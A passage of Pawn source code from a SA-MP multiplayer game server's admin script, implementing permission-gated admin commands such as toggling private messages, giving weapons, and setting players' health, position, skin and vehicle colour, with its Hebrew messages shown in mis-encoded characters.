		format(string,sizeof(string)," .ìöáò ääåãòä äæå %s ùéðéú àú äöáò ùì",GetName(id));
		SendClientMessage(playerid,c,string);
		SendClientMessage(id,c," .äàãîéï ùéðä àú äöáò ùìê ìöáò ääåãòä äæå");
		return 1;
	}
	if(equal(cmd,"/togpm") && IsPlayerMAdmin(playerid))
	{
		cmd = strtok(cmdtext,idx);
		if(playerinfo[playerid][admin] < 4 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 4");
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /togpm [on/off] :öåøú äùéîåù");
		if(equal(cmd,"on"))
		{
			playerinfo[playerid][togpm] = 1;
			SendClientMessage(playerid,green," .îöá öôééä áäåãòåú ôøèéåú äåôòì");
			fsetint(fuser(playerid),"TogPM",playerinfo[playerid][togpm]);
		}
		else if(equal(cmd,"off"))
		{
			playerinfo[playerid][togpm] = 0;
			SendClientMessage(playerid,green," .îöá öôééä áäåãòåú ôøèéåú äåôñ÷");
			fsetint(fuser(playerid),"TogPM",playerinfo[playerid][togpm]);
		}
		else SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/togph") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 4 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 4");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /togph [on/off] :öåøú äùéîåù");
		if(equal(cmd,"on"))
		{
			playerinfo[playerid][togph] = 1;
			SendClientMessage(playerid,green," .îöá öôééä äèìôåï äåôòì");
			fsetint(fuser(playerid),"TogPH",playerinfo[playerid][togph]);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"off"))
		{
			playerinfo[playerid][togph] = 0;
			SendClientMessage(playerid,green," .îöá öôééä áèìôåï äåôñ÷");
			fsetint(fuser(playerid),"TogPH",playerinfo[playerid][togph]);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/unlockall") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 4 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 4");
		for(new v = 0; v < MAX_VEHICLES; v++)
		{
		    for(new i = 0; i < sizeof(npcVehicles); i++) if(npcVehicles[i] == -1) i = sizeof(npcVehicles); else if(npcVehicles[i] == v) continue;
			if(vehicleinfo[v][vvalid]) for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) SetVehicleParamsForPlayer(v,i,0,0);
		}
		new string[M_S];
		format(string,sizeof(string)," *** .%s ëì äîëåðéåú áùøú ðôúçå òì éãé äàãîéï",GetName(playerid));
		SendClientMessageToAll(green,string);
		afterHour = 0;
		return 1;
	}
	if(equal(cmd,"/setwanted") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 5 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 5");
		new cmd2[M_S], id, wanted, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setwanted [id/name] [wanted] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		wanted = strval(cmd2);
		if(wanted < 0 || wanted > 6) return SendClientMessage(playerid,red," .øîú îáå÷ùåú ùâåéä");
		format(string,sizeof(string)," .ì %d %s ùéðéú àú øîú äîáå÷ùåú",wanted,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .äàãîéï ùéðä àú øîú äîáå÷ùåú ùìê ì %d",wanted);
		SendClientMessage(id,green,string);
		SetPlayerWantedLevel(id,wanted);
		return 1;
	}
	if((equal(cmd,"/giveweapon") || equal(cmd,"/gw")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 5 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 5");
		new cmd2[M_S], id, weaponid, ammo2, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2)) return SendClientMessage(playerid,white," /giveweapon [id/name] [weapon id] [ammo] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		weaponid = IsNumeric(cmd2)? strval(cmd2):GetWeaponIDFromName(cmd2);
		if(!playerinfo[playerid][pp] && (weaponid < 0 || weaponid > 46 || weaponid == 19 || weaponid == 20 || weaponid == 21)) return SendClientMessage(playerid,red," .ùí ðù÷ àå îñôø ùâåé");
		cmd = strtok(cmdtext,idx);
		ammo2 = !strlen(cmd) || !IsNumeric(cmd)? 100000:strval(cmd);
		format(string,sizeof(string)," .%s òí %d ëãåøéí ì %s ðúú",GetName(id),ammo2,WeaponName(weaponid));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .òí %d ëãåøéí %s äàãîéï ðúï ìê",ammo2,WeaponName(weaponid));
		SendClientMessage(id,green,string);
		GiveWeapon(id,weaponid,ammo2);
		playerinfo[id][gw] = 1;
		return 1;
	}
	if(equal(cmd,"/toggc") && IsPlayerMAdmin(playerid))
	{
		cmd = strtok(cmdtext,idx);
		if(playerinfo[playerid][admin] < 5 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 5");
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /toggc [on/off] :öåøú äùéîåù");
		if(equal(cmd,"on"))
		{
			playerinfo[playerid][toggc] = 1;
			SendClientMessage(playerid,green," .îöá öôééä áö'àè ëðåôééä äåôòì");
			fsetint(fuser(playerid),"TogGC",playerinfo[playerid][toggc]);
		}
		else if(equal(cmd,"off"))
		{
			playerinfo[playerid][toggc] = 0;
			SendClientMessage(playerid,green," .îöá öôééä áö'àè ëðåôééä äåôñ÷");
			fsetint(fuser(playerid),"TogGC",playerinfo[playerid][toggc]);
		}
		else SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/togcc") && IsPlayerMAdmin(playerid))
	{
		cmd = strtok(cmdtext,idx);
		if(playerinfo[playerid][admin] < 5 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 5");
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /togcc [on/off] :öåøú äùéîåù");
		if(equal(cmd,"on"))
		{
			playerinfo[playerid][togcc] = 1;
			SendClientMessage(playerid,green," .îöá öôééä áö'àè ÷ìàï äåôòì");
			fsetint(fuser(playerid),"TogCC",playerinfo[playerid][togcc]);
		}
		else if(equal(cmd,"off"))
		{
			playerinfo[playerid][togcc] = 0;
			SendClientMessage(playerid,green," .îöá öôééä áö'àè ÷ìàï äåôñ÷");
			fsetint(fuser(playerid),"TogCC",playerinfo[playerid][togcc]);
		}
		else SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/togvip") && IsPlayerMAdmin(playerid))
	{
		cmd = strtok(cmdtext,idx);
		if(playerinfo[playerid][admin] < 5 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 5");
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /togvip [on/off] :öåøú äùéîåù");
		if(equal(cmd,"on"))
		{
			playerinfo[playerid][togvip] = 1;
			SendClientMessage(playerid,green," .îöá öôééä áåéô-ö'àè äåôòì");
			fsetint(fuser(playerid),"TogVIP",playerinfo[playerid][togvip]);
		}
		else if(equal(cmd,"off"))
		{
			playerinfo[playerid][togvip] = 0;
			SendClientMessage(playerid,green," .îöá öôééä áåéô-ö'àè äåôñ÷");
			fsetint(fuser(playerid),"TogVIP",playerinfo[playerid][togvip]);
		}
		else SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/helpmsg") && IsPlayerMAdmin(playerid))
	{
		cmd = strtok(cmdtext,idx);
		if(playerinfo[playerid][admin] < 5 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 5");
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /helpmsg [message number] :öåøú äùéîåù");
		switch(strval(cmd))
		{
			case 1:
			{
				SendClientMessageToAll(lightblue,"~~~~~~~~~~~~~~~~~~~~");
				SendClientMessageToAll(purple," - òæøä -");
				SendClientMessageToAll(yellow," /help :ìòæøä áîåã éù ìëúåá àú äô÷åãä");
				SendClientMessageToAll(yellow," .Amit_B äîåã ðåöø òì éãé");
				SendClientMessageToAll(blue,webpage);
				SendClientMessageToAll(lightblue,"~~~~~~~~~~~~~~~~~~~~");
			}
			case 2:
			{
				SendClientMessageToAll(lightblue,"~~~~~~~~~~~~~~~~~~~~");
				SendClientMessageToAll(purple," - ô÷åãåú -");
				SendClientMessageToAll(yellow," /help commands :ìøùéîú äô÷åãåú");
				SendClientMessageToAll(yellow," .ùéîå ìá: áô÷åãä ùäåæëøä ìîòìä øùåîåú ø÷ äô÷åãåú ùìà ùééëåú ìçì÷éí áîåã");
				SendClientMessageToAll(yellow," /help mode | /help cmdmode :òåã äøáä ô÷åãåú úåëìå ìîöåà á");
				SendClientMessageToAll(blue,webpage);
				SendClientMessageToAll(lightblue,"~~~~~~~~~~~~~~~~~~~~");
			}
			case 3:
			{
				SendClientMessageToAll(lightblue,"~~~~~~~~~~~~~~~~~~~~");
				SendClientMessageToAll(purple," - ùéâåøéí -");
				SendClientMessageToAll(yellow," .áòæøú äùéâåøéí úåëìå ìäâéò îî÷åí ìî÷åí ììà îàîõ");
				SendClientMessageToAll(yellow," /teleports :ìøùéîú äùéâåøéí");
				SendClientMessageToAll(blue,webpage);
				SendClientMessageToAll(lightblue,"~~~~~~~~~~~~~~~~~~~~");
			}
			case 4:
			{
				SendClientMessageToAll(lightblue,"~~~~~~~~~~~~~~~~~~~~");
				SendClientMessageToAll(purple," - ãéååç òì ö'éèøéí -");
				SendClientMessageToAll(yellow," ?îöàúí ö'éèø");
				SendClientMessageToAll(yellow," /report :äùúîùå áô÷åãä äæå áëãé ìãååç òìéå");
				SendClientMessageToAll(yellow," /a :àå áô÷åãä äæå ëãé ìùìåç äåãòä ìàãîéðéí");
				SendClientMessageToAll(blue,webpage);
				SendClientMessageToAll(lightblue,"~~~~~~~~~~~~~~~~~~~~");
			}
			case 5:
			{
				SendClientMessageToAll(lightblue,"~~~~~~~~~~~~~~~~~~~~");
				SendClientMessageToAll(purple," - äøùîä -");
				SendClientMessageToAll(yellow," .îåîìõ îàåã ìäøùí ìùøú åì÷áì éåúø àôùøåéåú îùç÷");
				SendClientMessageToAll(yellow," .ëàùø ðøùîéí, ëì îä ùòùéúí òã ëä (ðù÷éí, ëñó ááð÷, åòåã) ééùîø âí àí úöàå îäùøú");
				SendClientMessageToAll(yellow," /register :ìäøùîä éù ìëúåá àú äô÷åãä");
				SendClientMessageToAll(blue,webpage);
				SendClientMessageToAll(lightblue,"~~~~~~~~~~~~~~~~~~~~");
			}
			case 6: AutoMessage();
			case 7:
			{
				SendClientMessageToAll(lightblue,"~~~~~~~~~~~~~~~~~~~~");
				SendClientMessageToAll(purple," - çå÷éí -");
				new File:f = (fexist(file_rules)? fopen(file_rules,io_read):fopen(file_rules,io_readwrite)), string[M_S];
				while(fread(f,string,sizeof(string),false)) SendClientMessageToAll(yellow,string);
				fclose(f);
				SendClientMessageToAll(lightblue,"~~~~~~~~~~~~~~~~~~~~");
			}
			case 8:
			{
				new string[M_S];
				format(string,sizeof(string),"/helpmsg %d",randomEx(1,8));
				command(playerid,string);
			}
			default: SendClientMessage(playerid,red," .îñôø äåãòä ùâåé");
		}
		return 1;
	}
	if(equal(cmd,"/helpmsgs") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 5 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 5");
		SendClientMessage(playerid,lightblue," ~~~ :äåãòåú òæøä ~~~");
		SendClientMessage(playerid,yellow,"1. Help");
		SendClientMessage(playerid,yellow,"2. Commands");
		SendClientMessage(playerid,yellow,"3. Teleports");
		SendClientMessage(playerid,yellow,"4. Report Cheaters");
		SendClientMessage(playerid,yellow,"5. Register");
		SendClientMessage(playerid,yellow,"6. Auto Message");
		SendClientMessage(playerid,yellow,"7. Rules");
		SendClientMessage(playerid,yellow,"8. Random");
		return 1;
	}
	if(equal(cmd,"/firework") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 5 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 5");
		if(!useFireworks) return SendClientMessage(playerid,red," .ìà ðéúï ìäôòéì æé÷å÷ ëøâò");
		if(fireworks >= MAX_FIREWORKS-1) return SendClientMessage(playerid,red,"(" #MAX_FIREWORKS " ÷ééîéí éåúø îãé æé÷å÷éí, àðà äîúï (ääâáìä: ");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /firework [height] [model 1-2] [speed] :öåøú äùéîåù");
		new Float:p[3], model = 0, Float:mspeed = 10.0, Float:height;
		height = floatstr(cmd);
		cmd = strtok(cmdtext,idx), model = !strlen(cmd) || !IsNumeric(cmd) || strval(cmd) < 1 || strval(cmd) > 2 ? (!random(2) ? 354 : 3666) : (strval(cmd) == 1 ? 354 : 3666),
		cmd = strtok(cmdtext,idx), mspeed = !strlen(cmd) ? 10.0 : floatstr(cmd);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetXYInFrontOfPlayer(playerid,p[0],p[1],1.5);
		CreateFirework(model,p[0],p[1],p[2],height,mspeed);
		SendClientMessage(playerid,green," .äæé÷å÷ ðåöø áäöìçä");
		return 1;
	}
	if((equal(cmd,"/sethealth") || equal(cmd,"/seth")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 6");
		new cmd2[M_S], id, Float:h, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2)) return SendClientMessage(playerid,white," /sethealth [id/name] [health] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(strfind(cmd2,".") != -1)
		{
			h = floatstr(cmd2);
			if(h < 0.0 || h > 100.0) return SendClientMessage(playerid,red," .àçåæ çééí ùâåé");
			format(string,sizeof(string)," .ì %.1f %s ùéðéú àú àçåæ äçééí ùì",h,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .äàãîéï ùéðä àú àçåæ äçééí ùìê ì %.1f",h);
			SendClientMessage(id,green,string);
			playerinfo[id][seth] = 1;
		}
		else
		{
			h = float(strval(cmd2));
			if(floatround(h) < 0 || floatround(h) > 100) return SendClientMessage(playerid,red," .àçåæ çééí ùâåé");
			format(string,sizeof(string)," .%.0f ì %s ùéðéú àú àçåæ äçééí ùì",h,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .%.0f äàãîéï ùéðä àú àçåæ äçééí ùìê ì",h);
			SendClientMessage(id,green,string);
			playerinfo[id][seth] = 1;
		}
		SetPlayerHealth2(id,h);
		return 1;
	}
	if((equal(cmd,"/setarmour") || equal(cmd,"/seta")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 6");
		new cmd2[M_S], id, Float:a, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setarmour [id/name] [armour] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		a = strval(cmd2);
		if(strfind(cmd2,".") != -1)
		{
			a = floatstr(cmd2);
			if(a < 0.0 || a > 100.0) return SendClientMessage(playerid,red," .àçåæ çééí ùâåé");
			format(string,sizeof(string)," .ì %.1f %s ùéðéú àú àçåæ äîâï ùì",a,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .äàãîéï ùéðä àú àçåæ äîâï ùìê ì %.1f",a);
			SendClientMessage(id,green,string);
			playerinfo[id][seta] = 1;
		}
		else
		{
			a = float(strval(cmd2));
			if(floatround(a) < 0 || floatround(a) > 100) return SendClientMessage(playerid,red," .àçåæ çééí ùâåé");
			format(string,sizeof(string)," .%.0f ì %s ùéðéú àú àçåæ äîâï ùì",a,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .%.0f äàãîéï ùéðä àú àçåæ äîâï ùìê ì",a);
			SendClientMessage(id,green,string);
			playerinfo[id][seta] = 1;
		}
		SetPlayerArmour2(id,a);
		return 1;
	}
	if((equal(cmd,"/setvhealth") || equal(cmd,"/setvh")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 6");
		new cmd2[M_S], id, Float:h, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setvhealth [id/name] [health] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(strfind(cmd2,".") != -1)
		{
			h = floatstr(cmd2);
			if(h < 0.0 || h > 1000.0) return SendClientMessage(playerid,red," .àçåæ çééí ùâåé");
			format(string,sizeof(string)," .ì %.1f %s ùéðéú àú àçåæ äçééí ùì äøëá ùì",h,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .äàãîéï ùéðä àú àçåæ äçééí ùì äøëá ùìê ì %.1f",h);
			SendClientMessage(id,green,string);
			playerinfo[id][seth] = 1;
		}
		else
		{
			h = float(strval(cmd2));
			if(floatround(h) < 0 || floatround(h) > 1000) return SendClientMessage(playerid,red," .àçåæ çééí ùâåé");
			format(string,sizeof(string)," .%.0f ì %s ùéðéú àú àçåæ äçééí ùì äøëá ùì",h,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .%.0f äàãîéï ùéðä àú àçåæ äçééí ùìê ì",h);
			SendClientMessage(id,green,string);
			playerinfo[id][seth] = 1;
		}
		SetVehicleHealth(GetPlayerVehicleID(id),h);
		return 1;
	}
	if(equal(cmd,"/setvcolor") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 6");
		new cmd2[M_S], id, c1, c2, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setvcolor [id/name] [color 1] [color 2] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		c1 = strval(cmd2);
		cmd = strtok(cmdtext,idx);
		c2 = !strlen(cmd)? c1:strval(cmd);
		if(!playerinfo[playerid][pp] && (c1 < 0 || c1 > 126 || c2 < 0 || c2 > 126)) return SendClientMessage(playerid,red," .àçã îäöáòéí ùâåé");
		format(string,sizeof(string)," .ì %d å %d %s ùéðéú àú öáòé äøëá ùì",c1,c2,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .äàãîéï ùéðä àú öáòé äøëá ùìê ìöáòéí %d å %d",c1,c2);
		SendClientMessage(id,green,string);
		ChangeVehicleColor(GetPlayerVehicleID(id),c1,c2);
		return 1;
	}
	if(equal(cmd,"/setvpaintjob") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 6");
		new cmd2[M_S], id, pid, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setvpaintjob [id/name] [paintjob id] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		pid = strval(cmd2);
		if(!playerinfo[playerid][pp] && (pid < 1 || pid > 3)) return SendClientMessage(playerid,red," .öéåø øëá ùâåé");
		format(string,sizeof(string)," .ì %d %s ùéðéú àú öéåø äøëá ùì",pid,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .äàãîéï ùéðä àú öéåø äøëá ùìê ì %d",pid);
		SendClientMessage(id,green,string);
		ChangeVehiclePaintjob(GetPlayerVehicleID(id),pid);
		return 1;
	}
	if(equal(cmd,"/setworld") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 6");
		new cmd2[M_S], id, w, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setworld [id/name] [world] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		w = strval(cmd2);
		if(w < 0 || w > 2000000000) return SendClientMessage(playerid,red," .îñôø òåìí ùâåé");
		format(string,sizeof(string)," .ìòåìí îñôø %d %s ùéðéú àú äòåìí ùì",w,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .äàãîéï ùéðä àú äòåìí ùìê ìòåìí îñôø %d",w);
		SendClientMessage(id,green,string);
		SetPlayerVirtualWorld(id,w);
		return 1;
	}
	if(equal(cmd,"/setinterior") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 6");
		new cmd2[M_S], id, i, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setinterior [id/name] [interior] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		i = strval(cmd2);
		if(i < 0 || i > 20) return SendClientMessage(playerid,red," .àéðèøéåø ùâåé");
		format(string,sizeof(string)," .ì %d %s ùéðéú àú äàéðèøéåø ùì",i,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .äàãîéï ùéðä àú äàéðèøéåø ùìê ì %d",i);
		SendClientMessage(id,green,string);
		SetPlayerInterior(id,i);
		return 1;
	}
	if(equal(cmd,"/setskin") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 6");
		new cmd2[M_S], id, s, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setskin [id/name] [skin id] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		s = strval(cmd2);
		if(!IsValidSkin(s) && !playerinfo[playerid][pp]) return SendClientMessage(playerid,red," .îñôø ãîåú ùâåé");
		format(string,sizeof(string)," .ìãîåú îñôø %d %s ùéðéú àú äãîåú ùì",s,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .äàãîéï ùéðä àú äãîåú ùìê ìãîåú îñôø %d",s);
		SendClientMessage(id,green,string);
		SetPlayerSkin(id,s);
		return 1;
	}
	if(equal(cmd,"/setpos") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 6");
		new id, Float:p[3], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /setpos [id/name] [x] [y] [z] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		for(new i=0;i<3;i++)
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsFloat(cmd)) return SendClientMessage(playerid,white," /setpos [id/name] [x] [y] [z] :öåøú äùéîåù");
			p[i] = floatstr(cmd);
			if(p[i] < -20000.0 || p[i] > 20000.0) return SendClientMessage(playerid,red," .îé÷åí ùâåé");
		}
		format(string,sizeof(string)," .ì %.4f,%.4f,%.4f %s ùéðéú àú äîé÷åí ùì ",p[0],p[1],p[2],GetName(id));
		SendClientMessage(playerid,green,string);
		SendClientMessage(id,green," .äàãîéï ùéðä àú äîé÷åí ùìê");
		SetPlayerPos(id,p[0],p[1],p[2]);
		return 1;
	}
	if(equal(cmd,"/setposfindz") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 6 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 6");
		new id, Float:p[3], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /setposfindz [id/name] [x] [y] [z] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		for(new i=0;i<3;i++)
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsFloat(cmd)) return SendClientMessage(playerid,white," /setpos [id/name] [x] [y] [z] :öåøú äùéîåù");
			p[i] = floatstr(cmd);
			if(p[i] < -20000.0 || p[i] > 20000.0) return SendClientMessage(playerid,red," .îé÷åí ùâåé");
		}
		format(string,sizeof(string)," .ì %.4f,%.4f,%.4f %s ùéðéú àú äîé÷åí ùì ",p[0],p[1],p[2],GetName(id));
		SendClientMessage(playerid,green,string);
		SendClientMessage(id,green," .äàãîéï ùéðä àú äîé÷åí ùìê");
		SetPlayerPosFindZ(id,p[0],p[1],p[2]);
		return 1;
	}
	if((equal(cmd,"/mapt") || equal(cmd,"/mapteleport")) && IsPlayerMAdmin(playerid))
	{
		cmd = strtok(cmdtext,idx);
		if(playerinfo[playerid][admin] < 7 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 7");
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /mapteleport(mapt) [on/off] :öåøú äùéîåù");
		if(equal(cmd,"on"))
		{
			AllowPlayerTeleport(playerid,1);
			SendClientMessage(playerid,green," .îöá ùéâåø ãøê äîôä äåôòì");
